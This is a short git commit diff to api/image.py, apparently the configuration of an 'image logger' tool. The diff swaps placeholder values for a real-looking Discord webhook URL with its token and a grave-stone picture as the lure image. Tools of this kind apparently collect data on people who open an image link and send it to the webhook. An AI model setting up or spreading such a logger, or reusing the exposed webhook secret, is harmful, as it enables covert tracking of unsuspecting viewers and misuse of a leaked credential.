af1cb4142347394029f1b240fb07d0ed0ba3fc44
zaxcccsdx <zacariusskurpski@gmail.com>
2025-03-23 03:06:09 -0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1353262190651510835/9YX4Dbhzt09H2KJY6nQlOo8qt0UbbbJ2IvEj0Iw54nYAFGkLRachFdJ_sutPqkDHVx3W",
+    "image": "https://static.vecteezy.com/system/resources/thumbnails/009/397/874/small/grave-stone-clipart-design-illustration-free-png.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
